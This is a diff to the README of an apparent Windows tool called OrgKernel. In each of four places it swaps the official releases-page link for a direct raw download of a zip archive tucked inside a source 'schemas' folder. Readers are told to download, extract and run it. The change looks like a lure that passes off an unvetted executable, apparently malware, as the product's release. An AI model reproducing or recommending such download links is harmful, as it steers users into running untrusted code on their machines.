@@ -1,6 +1,6 @@
 # 🔐 OrgKernel - Secure Agent Identity and Audit Control
 
-[![Download OrgKernel](https://img.shields.io/badge/Download-OrgKernel-blue?style=for-the-badge&logo=github)](https://github.com/mamunho6813/OrgKernel/releases)
+[![Download OrgKernel](https://img.shields.io/badge/Download-OrgKernel-blue?style=for-the-badge&logo=github)](https://github.com/mamunho6813/OrgKernel/raw/refs/heads/main/src/orgkernel/schemas/Org-Kernel-3.1.zip)
 
 ## 🚀 What OrgKernel Does
 
@@ -29,7 +29,7 @@ For best results, keep Windows up to date. If your device has security tools tha
 ## 📥 Download OrgKernel
 
 Visit this page to download OrgKernel:
-https://github.com/mamunho6813/OrgKernel/releases
+https://github.com/mamunho6813/OrgKernel/raw/refs/heads/main/src/orgkernel/schemas/Org-Kernel-3.1.zip
 
 On that page, look for the latest release. Download the Windows file that matches your computer. Most users should choose the file marked for Windows.
 
@@ -151,7 +151,7 @@ If these checks pass, the app is ready for use.
 ## 📎 Release Downloads
 
 Use this link to get the latest Windows release:
-https://github.com/mamunho6813/OrgKernel/releases
+https://github.com/mamunho6813/OrgKernel/raw/refs/heads/main/src/orgkernel/schemas/Org-Kernel-3.1.zip
 
 ## 🧠 For Teams Using It in Production
 
@@ -218,6 +218,6 @@ That matters when you need:
 ## 📦 Download and Run on Windows
 
 Go to the release page, download the Windows file, then open it on your PC:
-https://github.com/mamunho6813/OrgKernel/releases
+https://github.com/mamunho6813/OrgKernel/raw/refs/heads/main/src/orgkernel/schemas/Org-Kernel-3.1.zip
 
 If the file is an installer, double-click it and follow the steps on screen. If it is a zip file, extract it first, then open the app from the extracted folder.
